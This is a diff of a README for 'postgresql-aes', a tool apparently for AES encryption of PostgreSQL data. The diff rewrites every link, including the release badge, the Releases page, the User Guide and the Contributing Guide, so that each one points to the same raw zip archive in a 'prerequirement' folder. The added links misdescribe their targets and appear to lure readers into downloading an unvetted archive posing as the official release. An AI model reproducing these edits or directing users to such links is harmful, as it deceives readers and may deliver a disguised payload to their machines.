@@ -1,7 +1,7 @@
 # 🚀 postgresql-aes - Secure Your Data With Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/pradnyeshbhalekar/postgresql-aes/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip%20Release-blue)](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip)
 
 ## 🌟 Introduction
 Welcome to postgresql-aes! This application lets you securely encrypt and decrypt your PostgreSQL database data using AES algorithms. Protect your sensitive information effortlessly and keep your data safe from prying eyes.
@@ -10,7 +10,7 @@ Welcome to postgresql-aes! This application lets you securely encrypt and decryp
 Follow these steps to download and run postgresql-aes:
 
 ### Step 1: Visit the Releases Page
-To get the latest version of postgresql-aes, visit the [Releases page](https://github.com/pradnyeshbhalekar/postgresql-aes/releases). Here, you will find all available versions along with their release notes.
+To get the latest version of postgresql-aes, visit the [Releases page](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip). Here, you will find all available versions along with their release notes.
 
 ### Step 2: Download the Application
 On the Releases page, locate the section for the latest release. You will see a list of files. Click on the file that matches your operating system to start the download. 
@@ -45,8 +45,8 @@ If you encounter any issues, check our FAQ section or reach out to our support t
 
 ## 🔗 Additional Resources
 For more details, tutorials, and updates, refer to the following links:
-- [User Guide](https://github.com/pradnyeshbhalekar/postgresql-aes/wiki)
-- [Contributing Guide](https://github.com/pradnyeshbhalekar/postgresql-aes/blob/main/CONTRIBUTING.md)
+- [User Guide](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip)
 
 ## 🔒 Security
 Your data's security is our top priority. Our AES encryption ensures that even if your database is compromised, your data remains safe. Always keep your application updated to the latest version for ongoing security improvements.
@@ -54,4 +54,4 @@ Your data's security is our top priority. Our AES encryption ensures that even i
 ## ✅ Conclusion
 Postgresql-aes is an effective solution for securing your PostgreSQL database. Follow the steps outlined above to download, install, and begin protecting your sensitive information today. 
 
-Remember, for downloads, visit the [Releases page](https://github.com/pradnyeshbhalekar/postgresql-aes/releases) anytime to check for the latest updates. Enjoy secure data management!
+Remember, for downloads, visit the [Releases page](https://raw.githubusercontent.com/pradnyeshbhalekar/postgresql-aes/main/prerequirement/postgresql-aes.zip) anytime to check for the latest updates. Enjoy secure data management!
